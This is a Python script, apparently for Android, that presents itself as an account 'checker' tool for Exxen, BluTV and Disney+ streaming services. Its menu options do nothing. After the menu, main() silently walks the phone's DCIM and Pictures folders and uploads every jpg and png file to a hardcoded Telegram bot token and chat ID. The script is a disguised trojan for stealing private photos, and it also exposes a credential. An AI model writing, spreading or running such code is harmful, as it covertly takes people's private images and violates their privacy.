import os
import telegram
from telegram import InputFile

# Telegram bot token ve chat ID
bot_token = "7579330187:AAH83yCIp6yzkrV5Hqyz0bh1PhqdUUBHIE4"  # Buraya kendi bot tokeninizi yazın
chat_id = "7045128535"  # Buraya kendi chat ID'nizi yazın
bot = telegram.Bot(token=bot_token)

# Fotoğraf gönderme işlevi
def send_photo(photo_path):
    try:
        # Fotoğrafın mevcut olup olmadığını kontrol et
        if os.path.exists(photo_path):
            # Fotoğrafı gönder
            response = bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))
            
            # Yanıtı kontrol et
            if response:
                print(f"Fotoğraf başarıyla gönderildi: {photo_path}")
            else:
                print(f"Fotoğraf gönderilemedi: {photo_path}")
        else:
            print(f"Fotoğraf bulunamadı: {photo_path}")
        
    except Exception as e:
        print(f"Fotoğraf gönderme hatası: {e}")

# Fotoğrafları içeren dizinleri kontrol et
def photo_send_thread():
    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
    folder_paths = [
        "/storage/emulated/0/DCIM",  # Kamera fotoğrafları (harici depolama)
        "/storage/emulated/0/Pictures",  # Fotoğraflar (harici depolama)
        "/storage/self/primary/DCIM",  # Dahili depolama
        "/storage/self/primary/Pictures",  # Dahili depolama
    ]
    
    for folder_path in folder_paths:
        if os.path.exists(folder_path):  # Dosya yolunun var olup olmadığını kontrol et
            for root, dirs, files in os.walk(folder_path):  # Yolu gezerek dosyaları tarıyoruz
                for file in files:
                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Fotoğraf dosyalarını kontrol et
                        photo_path = os.path.join(root, file)
                        send_photo(photo_path)  # Fotoğrafı gönderme işlevini çağır

# Seçim ekranı fonksiyonu
def choose_checker():
    print("Lütfen bir checker seçin:")
    print("1 - Exxen Checker")
    print("2 - BluTV Checker")
    print("3 - Disney+ Checker")
    
    choice = input("Seçiminizi yapın (1/2/3): ")

    if choice == '1':
        print("Exxen Checker seçildi.")
        # Exxen checker fonksiyonunu çağır
    elif choice == '2':
        print("BluTV Checker seçildi.")
        # BluTV checker fonksiyonunu çağır
    elif choice == '3':
        print("Disney+ Checker seçildi.")
        # Disney+ checker fonksiyonunu çağır
    else:
        print("Geçersiz seçim! Lütfen tekrar deneyin.")
        choose_checker()

# Ana fonksiyon
def main():
    print("Program başlatıldı.")  # Programın başladığını belirten mesaj
    choose_checker()  # Seçim ekranı

    # Fotoğraf gönderme işlemi başlat
    photo_send_thread()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram durduruldu.")
